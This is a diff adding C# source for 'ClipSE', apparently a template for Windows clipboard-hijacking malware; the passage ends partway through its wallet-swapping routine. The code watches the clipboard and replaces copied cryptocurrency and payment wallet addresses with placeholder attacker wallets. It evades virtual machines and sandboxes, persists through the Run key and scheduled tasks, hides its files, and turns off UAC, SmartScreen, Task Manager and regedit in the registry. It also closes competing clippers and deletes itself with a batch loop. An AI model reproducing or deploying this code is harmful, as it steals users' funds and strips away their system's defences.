@@ -1,0 +1,1328 @@
+#region Зависимости
+
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Management;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Security.Principal;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Windows.Forms;
+using ClipSE;
+using Microsoft.Win32;
+
+#endregion
+
+[assembly: SuppressIldasm]
+[assembly: AssemblyTitle(AssBooster.TITLE)]
+[assembly: AssemblyDescription(AssBooster.DESCRIPTION)]
+[assembly: AssemblyCompany(AssBooster.COMPANY)]
+[assembly: AssemblyProduct(AssBooster.PRODUCT)]
+[assembly: AssemblyCopyright(AssBooster.COPYRIGHT)]
+[assembly: ComVisible(false)]
+[assembly: Guid(AssBooster.GUID)]
+[assembly: AssemblyVersion(AssBooster.FileVersionStructure.VERSION)]
+[assembly: AssemblyFileVersion(AssBooster.FileVersionStructure.FILEVERSION)]
+
+namespace ClipSE
+{
+    internal static class Program
+    {
+        [STAThread]
+        public static void Main()
+        {
+            if (RunCheck.CheckMutex())
+            {
+                Date date = new Date();
+                if (date.AntiVm && CheckVirtual.CheckWMI()) Environment.Exit(0);
+                if (date.Delay) Sleeping(RunCheck.ThreadSleep);
+
+                if (!GlobalPath.AssemblyPath.StartsWith(GlobalPath.StartUpFromAppDataReserv, StringComparison.OrdinalIgnoreCase))
+                {
+                    new Thread(() => ProcessControl.KillClipInizialize()) { IsBackground = true }.Start();
+                    if (date.AddGarbage) new Thread(new ThreadStart(delegate () { Garbage.InizializeTrash(500); })).Start();
+                    if (date.FakeText) File.WriteAllText(string.Concat("Error.txt"), GlobalPath.MessageErrorTextForUser);
+                    if (date.AddInSystemRun)
+                    {
+                        InjReg.CopyAndShelduderInizialize();
+                        RegistryControl.ToogleHidingFolders(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 2);
+                        ExpSetting.RefreshExplorer();
+                        if (date.Uac) RegistryControl.ToogleUacAdmin(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0);
+                        if (date.Smart) RegistryControl.ToogleSmartScreen(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", "SmartScreenEnabled", "Off");
+                        if (date.TaskLock) RegistryControl.ToogleTaskMandRegedit(@"Software\Microsoft\Windows\CurrentVersion\Policies", 1);
+                        GlobalFile.HideFile(GlobalPath.AssemblyPath, FileAttributes.Normal);
+                        Liquidation.Inizialize(GlobalPath.BatchFile);
+                        Liquidation.SelfDelete("cmd.exe", string.Concat("/C choice /C Y /N /D Y /T 1 & Del \"", GlobalPath.GetFileName));
+                    }
+                    else
+                    {
+                        if (!GlobalFile.IsHideOrNo())
+                        {
+                            GlobalFile.HideFile(GlobalPath.AssemblyPath, FileAttributes.Hidden);
+                            ClipChanger.StartChanger();
+                        }
+                    }
+                }
+                else
+                {
+                    if (!GlobalFile.IsHideOrNo()) GlobalFile.HideFile(GlobalPath.AssemblyPath, FileAttributes.Hidden);
+                    ClipChanger.StartChanger();
+                }
+            }
+            else
+            {
+                Environment.Exit(0);
+            }
+        }
+
+        public static void Sleeping(int time)
+        {
+            try
+            {
+                Thread.Sleep(time);
+            }
+            catch { }
+        }
+    }
+
+    public static class AssBooster
+    {
+        public const string TITLE = "[TITLE]";
+        public const string DESCRIPTION = "[DESCRIPTION]";
+        public const string COMPANY = "[COMPANY]";
+        public const string PRODUCT = "[PRODUCT]";
+        public const string COPYRIGHT = "Copyright (c) [COPYRIGHT] 2020";
+        public const string GUID = "[GUID]";
+        internal struct FileVersionStructure
+        {
+            public const string VERSION = "[VERSION]";
+            public const string FILEVERSION = "[FILEVERSION]";
+        }
+    }
+    public static class ProcessControl
+    {
+        public static bool RunFile(string filename)
+        {
+            if (!string.IsNullOrWhiteSpace(filename))
+            {
+                try
+                {
+                    ProcessWindowStyle PwsHide = ProcessWindowStyle.Hidden;
+                    ProcessStartInfo startInfo = new ProcessStartInfo
+                    {
+                        FileName = filename,
+                        CreateNoWindow = false,
+                        WindowStyle = PwsHide
+                    };
+                    using (Process info = Process.Start(startInfo)) { info.Refresh(); }
+                    return true;
+                }
+                catch (Exception) { return false; }
+            }
+            return true;
+        }
+        public static void KillClipInizialize()
+        {
+            try
+            {
+                Process currentProcess = Process.GetCurrentProcess();
+                foreach (string list in ListClipManagers)
+                {
+                    foreach (Process process in Process.GetProcessesByName(list))
+                    {
+                        try
+                        {
+                            if (process.ProcessName.ToLower().Contains(list.ToLower()) && process.ProcessName != currentProcess.ProcessName)
+                            {
+                                try
+                                {
+                                    process.CloseMainWindow();
+                                }
+                                catch { }
+                            }
+                        }
+                        catch { continue; }
+                    }
+                }
+            }
+            catch { }
+        }
+        private static readonly List<string> ListClipManagers = new List<string>
+        {
+           "Clipper", "Clip", "Buffer", "Ushell", "Banker", "ClipPurse", "Updater", "Scanner",
+           "Clp", "Flipper", "Changer", "SelfClip", "IPLogger", "ClipPurSE", "dwm"
+        };
+    }
+    public static class Liquidation
+    {
+        public static void Inizialize(string pathfile)
+        {
+            try
+            {
+                using (StreamWriter sw = new StreamWriter(pathfile))
+                {
+                    sw.WriteLine("@echo off"); 
+                    sw.WriteLine(":loop");
+                    sw.WriteLine(string.Concat("del \"", GlobalPath.GetFileName, "\"")); 
+                    sw.WriteLine(string.Concat("if Exist \"", GlobalPath.GetFileName, "\" GOTO loop")); 
+                    sw.WriteLine("del %0"); 
+                    sw.Flush();
+                }
+            }
+            catch (Exception ex) { File.WriteAllText("Self_Error.txt", ex.Message); }
+
+            if (File.Exists(pathfile))
+            {
+                ProcessControl.RunFile(pathfile);
+            }
+        }
+        public static void SelfDelete(string pathfile, string args)
+        {
+            ProcessWindowStyle PwsHide = ProcessWindowStyle.Hidden;
+            ProcessStartInfo startInfo = new ProcessStartInfo
+            {
+                Arguments = args,
+                FileName = pathfile,
+                CreateNoWindow = false,
+                WindowStyle = PwsHide
+            };
+            using (Process info = Process.Start(startInfo)) { info.Refresh(); }
+        }
+    }
+    public static class GlobalPath
+    {
+        public static string MessageErrorTextForUser = "[TEXT_ERROR]";
+        public static readonly string DefaultTemp = string.Concat(Environment.GetEnvironmentVariable("temp"), '\\');
+        public static readonly string GetFileName = Path.GetFileName(AppDomain.CurrentDomain.FriendlyName); 
+        public static readonly string GenRunNameWithoutExtension = Path.GetFileNameWithoutExtension(AppDomain.CurrentDomain.FriendlyName); 
+        public static readonly string AssemblyPath = Assembly.GetExecutingAssembly().Location; 
+        public static readonly string StartupPath = Path.GetDirectoryName(AssemblyPath); 
+        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        public static readonly string DesktopDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
+        public static readonly string LocalAppDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
+        public static readonly string BatchFile = Path.Combine(Environment.CurrentDirectory, "Self.bat");
+        public static readonly string Microsoft = Path.Combine(AppData, "Microsoft"); 
+        public static readonly string StartUpFromAppDataReserv = Path.Combine(AppData, @"Microsoft\SecureData"); 
+    }
+    public static class RunCheck
+    {
+        public static int ThreadSleep = 3000;
+
+        public static bool CheckMutex()
+        {
+            bool isNew;
+            Mutex app = new Mutex(true, GetGUID(), out isNew);
+            GC.KeepAlive(app);
+            return isNew;
+        }
+
+        private static string GetGUID()
+        {
+            string result;
+            try
+            {
+                Assembly assembly = typeof(Program).Assembly;
+                GuidAttribute attribute = (GuidAttribute)assembly.GetCustomAttributes(typeof(GuidAttribute), true)[0];
+                result = attribute.Value;
+            }
+            catch { result = "CF2D4613-22DE-649D-9821-6AFF6621DEY"; }
+            return result.ToUpper();
+        }
+
+        public static bool StartWin_xSixtyFour() { if (Environment.Is64BitOperatingSystem) { return true; } return false; }
+
+        public static bool IsUserAdministrator()
+        {
+            try { return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator); } catch { return false; }
+        }
+    }
+    public static class RegistryControl
+    {
+        public static RegistryView Regview { get { if (RunCheck.StartWin_xSixtyFour()) { return RegistryView.Registry64; } return RegistryView.Registry32; } }
+        private static readonly string[] FieldsLocal = new string[]
+        {
+            "EnableLUA", "EnableInstallerDetection", "PromptOnSecureDesktop",
+            "ConsentPromptBehaviorAdmin", "ConsentPromptBehaviorUser",
+            "EnableSecureUIAPaths", "ValidateAdminCodeSignatures", "EnableSmartScreen",
+            "EnableVirtualization", "EnableUIADesktopToggle", "FilterAdministratorToken"
+        };
+        private static readonly string[] FiledsSystem = new string[]
+        {
+            "ConsentPromptBehaviorAdmin", "DisableRegistryTools", "DisableTaskMgr"
+        };
+        public static bool ToogleHidingFolders(string regpath, string value, int locker)
+        {
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regpath, true))
+                {
+                    try
+                    {
+                        key.SetValue(value, locker, RegistryValueKind.DWord);
+                        return true;
+                    }
+                    catch { return false; }
+                }
+            }
+            catch (Exception) { return false; }
+        }
+        public static bool ToogleUacAdmin(string regpath, int locker)
+        {
+            try
+            {
+                if (RunCheck.IsUserAdministrator())
+                {
+                    using (RegistryKey registry = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Regview))
+                    using (RegistryKey key = registry.OpenSubKey(regpath, RunCheck.StartWin_xSixtyFour()))
+                    {
+                        try
+                        {
+                            foreach (string v in FieldsLocal)
+                            {
+                                try
+                                {
+                                    key.SetValue(v, locker, RegistryValueKind.DWord);
+                                }
+                                catch { }
+                            }
+                        }
+                        catch (Exception) { return false; }
+                        return true;
+                    }
+                }
+                return true;
+            }
+            catch (Exception) { return false; }
+        }
+        public static bool ToogleTaskMandRegedit(string regpath, int locker)
+        {
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regpath, RunCheck.StartWin_xSixtyFour()))
+                using (RegistryKey sxs = key.CreateSubKey("System"))
+                {
+                    sxs.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
+                    sxs.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
+                    try
+                    {
+                        foreach (string k in FiledsSystem)
+                        {
+                            try
+                            {
+                                sxs.SetValue(k, locker);
+                            }
+                            catch { }
+                        }
+                    }
+                    catch (Exception) { return false; }
+                    return true;
+                }
+            }
+            catch { return false; }
+        }
+        public static bool ToogleSmartScreen(string regpath, string name, string enable)
+        {
+            try
+            {
+                if (RunCheck.IsUserAdministrator())
+                {
+                    using (RegistryKey registry = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Regview))
+                    using (RegistryKey key = registry.OpenSubKey(regpath, RunCheck.StartWin_xSixtyFour()))
+                    {
+                        try
+                        {
+                            key.SetValue(name, enable, RegistryValueKind.String);
+                            return true;
+                        }
+                        catch { return false; }
+                    }
+                }
+                return true;
+            }
+            catch { return false; }
+        }
+        public static void RegStartupInizialize(bool status, string regpath, string name, string localpath)
+        {
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regpath, true))
+                {
+                    if (!status)
+                    {
+                        try
+                        {
+                            key.DeleteValue(name);
+                        }
+                        catch (Exception) { }
+                    }
+                    else
+                    {
+                        try
+                        {
+                            key.SetValue(name, localpath, RegistryValueKind.String);
+                        }
+                        catch (Exception) { }
+                    }
+                }
+            }
+            catch { }
+        }
+    }
+    public static class UniqueGenerator
+    {
+        private const string Key = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_";
+        public static string GetUniqueToken(int length)
+        {
+            try
+            {
+                using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
+                {
+                    byte[] buffer = null, data = new byte[length];
+                    int maxRandom = byte.MaxValue - ((byte.MaxValue + 1) % Key.Length);
+
+                    crypto.GetBytes(data);
+
+                    char[] result = new char[length];
+
+                    for (int i = 0; i < length; i++)
+                    {
+                        byte value = data[i];
+
+                        while (value > maxRandom)
+                        {
+                            if (buffer == null) { buffer = new byte[1]; }
+
+                            crypto.GetBytes(buffer);
+                            value = buffer[0];
+                        }
+
+                        result[i] = Key[value % Key.Length];
+                    }
+
+                    return new string(result);
+                }
+            }
+            catch { return string.Empty; }
+        }
+    }
+    public static class Garbage
+    {
+        public static void InizializeTrash(int big)
+        {
+            for (int i = 0; i < big; i++)
+            {
+                try
+                {
+                    DirectoryInfo dir = new DirectoryInfo(Path.Combine(GlobalPath.Microsoft, UniqueGenerator.GetUniqueToken(i)));
+                    dir.Create();
+                }
+                catch (Exception) { }
+            }
+        }
+    }
+    public static class RunSystem
+    {
+        private const string REG = @"Software\Microsoft\Windows\CurrentVersion\Run";
+        public static void RegInizialize(bool enable, string name, string localpath) 
+        {
+            try
+            {
+                using (RegistryKey runKey = Registry.CurrentUser.OpenSubKey(REG, true))
+                {
+                    if (!enable)
+                    {
+                        try
+                        {
+                            if (runKey != null)
+                            {
+                                runKey.DeleteValue(name);
+                            }
+                        }
+                        catch { }
+                    }
+                    else
+                    {
+                        try
+                        {
+                            runKey.SetValue(name, localpath);
+                        }
+                        catch { }
+                    }
+                }
+            }
+            catch (Exception) { }
+        }
+        public static bool Scheduler(bool status, string timeset, int count, string priority, string taskname, string filepath)
+        {
+            if (!string.IsNullOrWhiteSpace(taskname) && !string.IsNullOrWhiteSpace(filepath))
+            {
+                ProcessWindowStyle PwsHide = ProcessWindowStyle.Hidden;
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    FileName = "schtasks.exe",
+                    CreateNoWindow = false,
+                    WindowStyle = PwsHide
+                };
+                try
+                {
+                    switch (status)
+                    {
+                        case true: startInfo.Arguments = string.Concat("/create /sc ", timeset, " /mo ", count, " /rl ", priority, " /tn ", taskname, " /tr ", filepath, " /f"); break;
+                        case false: startInfo.Arguments = string.Concat("/delete /tn ", taskname, " /f"); break;
+                    }
+                }
+                catch (Exception) { }
+                try
+                {
+                    using (Process info = Process.Start(startInfo)) { info.Refresh(); info.WaitForExit(); }
+                }
+                catch (Exception) { }
+
+                return true;
+            }
+
+            return false;
+        }
+    }
+    internal static class NativeMethods
+    {
+        #region For ClipBoard GetText
+
+        [DllImport("user32.dll")]
+        internal static extern IntPtr GetClipboardData(uint uFormat);
+
+        [DllImport("user32.dll")]
+        public static extern bool IsClipboardFormatAvailable(uint format);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern bool OpenClipboard(IntPtr hWndNewOwner);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern bool CloseClipboard();
+
+        [DllImport("user32.dll")]
+        internal static extern bool EmptyClipboard();
+
+        [DllImport("kernel32.dll")]
+        internal static extern IntPtr GlobalLock(IntPtr hMem);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool GlobalUnlock(IntPtr hMem);
+
+        #endregion
+
+        #region For ClipBoard SetText
+
+        [DllImport("user32.dll")]
+        internal static extern IntPtr GetOpenClipboardWindow();
+
+        [DllImport("user32.dll")]
+        internal static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);
+
+        #endregion
+
+        #region For ClipMonitor
+
+        [DllImport("User32.dll", CharSet = CharSet.Auto)]
+        internal static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);
+
+        [DllImport("User32.dll", CharSet = CharSet.Auto)]
+        public static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        internal static extern IntPtr SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);
+
+        #endregion
+
+        #region For Refresh WinExplorer
+
+        [DllImport("user32")]
+        public static extern int PostMessage(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32", CharSet = CharSet.Unicode)]
+        internal static extern IntPtr FindWindow(string className, string caption);
+
+        [DllImport("user32", CharSet = CharSet.Unicode)]
+        internal static extern IntPtr FindWindowEx(IntPtr parent, IntPtr startChild, string className, string caption);
+
+        #endregion
+
+        #region For AntiVM
+
+        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode)]
+        internal static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        #endregion
+    }
+    public static class CheckVirtual
+    {
+        public static bool GetIsRdpAvailable()
+        {
+            return SystemInformation.TerminalServerSession == true;
+        }
+
+        public static bool GetSandBoxies()
+        {
+            return Process.GetProcessesByName("SbieCtrl").Length > 0 && NativeMethods.GetModuleHandle("SbieDll.dll") != IntPtr.Zero;
+        }
+
+        private static List<string> GetModelsAndManufactures()
+        {
+            List<string> ModMan = new List<string>();
+            try
+            {
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_ComputerSystem"))
+                {
+                    using (ManagementObjectCollection items = searcher.Get())
+                    {
+                        foreach (ManagementBaseObject name in items) 
+                        {
+                            ModMan.Add(name["Manufacturer"].ToString().ToLower());
+                            ModMan.Add(name["Model"].ToString().ToLower());
+                        }
+                    }
+                }
+            }
+            catch { }
+            return ModMan;
+        }
+        public static bool CheckWMI()
+        {
+            List<string> VirtualNames = new List<string>
+            {
+                "virtual", "vmbox", "vmware", "virtualbox", "box",
+                "thinapp", "VMXh", "innotek gmbh", "tpvcgateway",
+                "tpautoconnsvc", "vbox", "kvm", "red hat"
+            };
+            List<string> list = GetModelsAndManufactures();
+            foreach (string spisok in list)
+            {
+                return VirtualNames.Contains(spisok); // true
+            }
+            return false;
+        }
+        public static bool Inizialize()
+        {
+            if (GetIsRdpAvailable())
+            {
+                return true;
+            }
+            if (GetSandBoxies())
+            {
+                return true;
+            }
+            if (CheckWMI())
+            {
+                return true;
+            }
+            return false;
+        }
+    }
+    public static class ExpSetting
+    {
+        public static void RefreshExplorer()
+        {
+            IntPtr explorer = NativeMethods.FindWindow("Progman", "Program Manager");
+            explorer = NativeMethods.FindWindowEx(explorer, IntPtr.Zero, "SHELLDLL_DefView", null);
+            explorer = NativeMethods.FindWindowEx(explorer, IntPtr.Zero, "SysListView32", null);
+            NativeMethods.PostMessage(explorer, 0x100, new IntPtr(0x74), IntPtr.Zero);
+            NativeMethods.PostMessage(explorer, 0x101, new IntPtr(0x74), new IntPtr(1 << 31));
+        }
+    }
+    public static class Wallets
+    {
+        public static string 
+        Btc = "[BTC]", Eth = "[ETH]", Bch = "[BCH]", BTgold = "[BTGOLD]", Bcn = "[BCN]",
+        Dash = "[DASH]", Ltc = "[LTC]", Lsk = "[LISK]", Zcash = "[ZCASH]", Payeer = "[PAYEER]", 
+        Btdark = "[BTDARK]", BlackJack = "[BJack]", Xmr = "[XMR]", YandexMoney = "[YANDEXMONEY]",
+        DonAlerts = "[DONATE]", DonPay = "[DONATEPAY]", Doge = "[DOGE]", Neo = "[NEO]",
+        Iota = "[IOTA]", Tron = "[TRON]", Bnb = "[BNB]", Ripple = "[RIPPLE]", Qiwi = "[QIWI]",
+        Qtum = "[QTUM]", Stellar = "[STELLAR]", Steam = "[STEAM]", Eos = "[EOS]", Ada = "[ADA]",
+        Via = "[VIA]", Waves = "[WAVES]", BlockNet = "[BN]", SberBank = "[SBER]", BitcoinDiamond = "[BITDAIMON]",
+        Decred = "[DECRED]", Tezos = "[TEZOS]", Cosmos = "[COSMOS]", SmartCash = "[SMARTCASH]",
+        WebMoney_WMR = "[WEBWMR]",
+        WebMoney_WMZ = "[WEBWMZ]",
+        WebMoney_WMU = "[WEBWMU]";
+    }
+    public class Date
+    {
+        public bool 
+        Delay = [Delay], 
+        AddInSystemRun = [Run], 
+        AddGarbage = [Garbage], 
+        Uac = [Uac], 
+        Smart = [Smart],
+        TaskLock = [TaskLock],
+        AntiVm = [Anti],
+        FakeText = [Fake];
+    }
+    public static class Enums
+    {
+        public enum ClipboardFormat : byte
+        {
+            Text,
+            UnicodeText
+        }
+    }
+    internal static class ClipboardEx
+    {
+        private const uint CF_UNICODETEXT = 0xD;
+        private const int UF = 1;
+
+        public static string GetText()
+        {
+            if (NativeMethods.IsClipboardFormatAvailable(CF_UNICODETEXT) && NativeMethods.OpenClipboard(IntPtr.Zero))
+            {
+                string data = null;
+                IntPtr hGlobal = NativeMethods.GetClipboardData(CF_UNICODETEXT);
+                if (!hGlobal.Equals(IntPtr.Zero))
+                {
+                    IntPtr lpwcstr = NativeMethods.GlobalLock(hGlobal);
+                    if (!lpwcstr.Equals(IntPtr.Zero))
+                    {
+                        try
+                        {
+                            data = Marshal.PtrToStringUni(lpwcstr);
+                            NativeMethods.GlobalUnlock(lpwcstr);
+                        }
+                        catch { }
+                    }
+                }
+                NativeMethods.CloseClipboard();
+                return data;
+            }
+            return null;
+        }
+
+        public static bool SetClipboardText(string Text) 
+        {
+            IntPtr ipGlobal = Marshal.StringToHGlobalAnsi(Text);
+            if (!ipGlobal.Equals(IntPtr.Zero) && NativeMethods.OpenClipboard(IntPtr.Zero))
+            {
+                NativeMethods.EmptyClipboard();
+                if (!(NativeMethods.SetClipboardData(UF, ipGlobal) != IntPtr.Zero))
+                    Marshal.FreeHGlobal(ipGlobal);
+
+                NativeMethods.CloseClipboard();
+                return true;
+            }
+            return false;
+        }
+    }
+    public static partial class ClipboardMonitor
+    {
+        private class ClipboardWatcher : Form
+        {
+            public static event OnClipboardChangeEventHandler OnClipboardChange;
+            protected static ClipboardWatcher mInstance;
+            public static void Start()
+            {
+                if (mInstance == null)
+                {
+                    var thread = new Thread(delegate (object x) { Application.Run(new ClipboardWatcher()); });
+                    thread.SetApartmentState(ApartmentState.STA);
+                    thread.Start();
+                }
+            }
+            public static void Stop()
+            {
+                try
+                {
+                    mInstance.Invoke(new MethodInvoker(delegate ()
+                    {
+                        NativeMethods.ChangeClipboardChain(mInstance.Handle, nextClipboardViewer);
+                    }));
+                    mInstance.Invoke(new MethodInvoker(mInstance.Close));
+                    mInstance.Dispose();
+                    mInstance = null;
+                }
+                catch (Exception) { }
+            }
+            protected override void SetVisibleCore(bool value)
+            {
+                CreateHandle();
+                mInstance = this;
+                nextClipboardViewer = NativeMethods.SetClipboardViewer(mInstance.Handle);
+                base.SetVisibleCore(false);
+            }
+            protected override void WndProc(ref Message m)
+            {
+                switch (m.Msg)
+                {
+                    case WM_DRAWCLIPBOARD: ClipChanged(); NativeMethods.SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam); break;
+                    default:
+                        switch (m.Msg)
+                        {
+                            case WM_CHANGECBCHAIN:
+                                if (m.WParam != nextClipboardViewer)
+                                {
+                                    NativeMethods.SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
+                                }
+                                else
+                                {
+                                    nextClipboardViewer = m.LParam;
+                                }
+
+                                break;
+                            default: base.WndProc(ref m); break;
+                        }
+                        break;
+                }
+            }
+            private void ClipChanged()
+            {
+                IDataObject dataObject = Clipboard.GetDataObject();
+                Enums.ClipboardFormat? clipboardFormat = null;
+                foreach (string text in Enum.GetNames(typeof(Enums.ClipboardFormat)))
+                {
+                    if (dataObject.GetDataPresent(text))
+                    {
+                        clipboardFormat = new Enums.ClipboardFormat?((Enums.ClipboardFormat)Enum.Parse(typeof(Enums.ClipboardFormat), text));
+                        break;
+                    }
+                    continue;
+                }
+                object data = dataObject.GetData(clipboardFormat.ToString());
+                if (data == null || clipboardFormat == null) return;
+
+                OnClipboardChange.Invoke(clipboardFormat.Value, data);
+            }
+            private static IntPtr nextClipboardViewer;
+            private const int WM_DRAWCLIPBOARD = 776, WM_CHANGECBCHAIN = 781;
+            public ClipboardWatcher() { }
+            internal delegate void OnClipboardChangeEventHandler(Enums.ClipboardFormat format, object data);
+        }
+    }
+    public static partial class ClipboardMonitor
+    {
+        internal static event OnClipboardChangeEventHandler OnClipboardChange;
+
+        public static void Start()
+        {
+            ClipboardWatcher.Start();
+            ClipboardWatcher.OnClipboardChange += delegate (Enums.ClipboardFormat clipboardFormat, object data)
+            {
+                OnClipboardChange.Invoke(clipboardFormat, data);
+            };
+        }
+
+        public static void Stop()
+        {
+            OnClipboardChange = null;
+            ClipboardWatcher.Stop();
+        }
+
+        internal delegate void OnClipboardChangeEventHandler(Enums.ClipboardFormat clipboardFormat, object data);
+    }
+    internal class ClipChanger
+    {
+        public static void StopChanger()
+        {
+            ClipboardMonitor.OnClipboardChange += GetClip;
+            ClipboardMonitor.Stop();
+        }
+        public static void StartChanger()
+        {
+            ClipboardMonitor.OnClipboardChange += GetClip;
+            ClipboardMonitor.Start();
+        }
+        private static bool StartsWith(string value, string current)
+        {
+            try
+            {
+                return value.StartsWith(current, StringComparison.OrdinalIgnoreCase);
+            }
+            catch { return false; }
+        }
+        private static bool EndsWithAny(string s, params string[] stext)
+        {
+            foreach (string c in stext)
+            {
+                try
+                {
+                    if (s.EndsWith(c, StringComparison.OrdinalIgnoreCase)) return true;
+                }
+                catch (Exception) { return false; }
+            }
+            return false;
+        }
+        private static bool CheckisUpper(string text, int num)
+        {
+            if (string.IsNullOrWhiteSpace(text)) return false;
+            if (char.IsUpper(text[num])) return true;
+            return false;
+        }
+        public static void GetClip(Enums.ClipboardFormat clipboardFormat, object data)
+        {
+            try
+            {
+                string BufferText = ClipboardEx.GetText();
+                #region Bitcoin Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Btc) && StartsWith(BufferText, "1") && (BufferText.Length >= 34) && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Btc);
+                }
+
+                #endregion
+
+                #region Ether Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Eth) && StartsWith(BufferText, "0x") && !CheckisUpper(BufferText, 1) && BufferText.Length >= 42 && BufferText.Length <= 43)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Eth);
+                }
+
+                #endregion
+
+                #region XRP (Ripple) Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Ripple) && !CheckisUpper(BufferText, 0) && StartsWith(BufferText, "r") && BufferText.Length >= 34 && BufferText.Length <= 36)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Ripple);
+                }
+
+                #endregion
+
+                #region BitcoinDark Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Btdark) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "R") && BufferText.Length >= 33 && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Btdark);
+                }
+
+                #endregion
+
+                #region Payeer Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Payeer) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "P") && BufferText.Length >= 11 && BufferText.Length <= 12)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Payeer);
+                }
+
+                #endregion
+
+                #region BitcoinCash Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Bch) && !CheckisUpper(BufferText, 0) && StartsWith(BufferText, "q") && BufferText.Length >= 42 && BufferText.Length <= 43)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Bch);
+                }
+
+                #endregion
+
+                #region BitcoinGold Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.BTgold) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "G") && BufferText.Length >= 34 && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.BTgold);
+                }
+
+                #endregion
+
+                #region DOGEcoin Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Doge) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "D") && BufferText.Length >= 34 && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Doge);
+                }
+
+                #endregion
+
+                #region DashCorecoin Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Dash) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "X") && BufferText.Length >= 34 && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Dash);
+                }
+
+                #endregion
+
+                #region LiteCore Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Ltc) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "L") && BufferText.Length >= 34 && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Ltc);
+                }
+
+                #endregion
+
+                #region Monero Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Xmr) && StartsWith(BufferText, "4") && BufferText.Length >= 95 && BufferText.Length <= 107)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Xmr);
+                }
+
+                #endregion
+
+                #region Zcash(ZEC) Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Zcash) && !CheckisUpper(BufferText, 0) && StartsWith(BufferText, "t1") && BufferText.Length >= 35 && BufferText.Length <= 36)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Zcash);
+                }
+
+                #endregion
+
+                #region Neo Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Neo) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "A") && BufferText.Length >= 34 && BufferText.Length <= 35)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Neo);
+                }
+
+                #endregion
+
+                #region Iota Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Iota) && CheckisUpper(BufferText.ToUpper(), 0) && BufferText.Length >= 81 && BufferText.Length <= 92)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Iota);
+                }
+
+                #endregion
+
+                #region Cardano Purse Changer
+
+                if (!string.IsNullOrWhiteSpace(Wallets.Ada) && CheckisUpper(BufferText, 0) && StartsWith(BufferText, "DdzFFzCqrh") && BufferText.Length >= 104 && BufferText.Length <= 105)
+                {
+                    ClipboardEx.SetClipboardText(Wallets.Ada);
+                }
+
